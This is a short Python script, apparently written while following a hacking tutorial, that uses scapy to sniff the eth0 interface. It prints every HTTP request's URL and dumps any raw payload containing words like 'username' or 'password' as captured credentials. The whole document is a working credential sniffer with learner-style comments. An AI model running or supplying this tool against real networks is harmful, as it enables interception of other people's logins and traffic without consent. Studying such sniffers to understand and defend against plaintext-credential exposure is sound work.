#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http #to filter layers in packets

def sniff(interface): #takes an interface->to capture data 
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet) #takes the interface as argument, store is false so it does not take up space in system, prn tells scapy for every sniffed data call a function

def get_url(packet):
    host = packet[http.HTTPRequest].Host
    path = packet[http.HTTPRequest].Path
    if isinstance(host,bytes):
        host = host.decode(errors = 'ignore')
    if isinstance(path,bytes):
        path = path.decode(errors='ignore')
    return  host + path 

def get_login_info(packet):
      if packet.haslayer(scapy.Raw): #particular layer and field
            load= packet[scapy.Raw].load
            try:
                load = load.decode()
            except UnicodeDecodeError:
                return None 
            keywords = ["username", "user", "login", "password", "pass"]
            for keyword in keywords:
                if keyword in load:
                    return load
                                            
def process_sniffed_packet(packet): #takes a packet and print it
    if packet.haslayer(http.HTTPRequest):#if packet has http layer
        url = get_url(packet)
        print("[+] HTTP Request >>" + url)
        login_info = get_login_info(packet)
        if login_info:
            print ("\n\n[+] Possible username/password>" + str(login_info) + "\n\n")
    
    
sniff("eth0") #passing interface argument
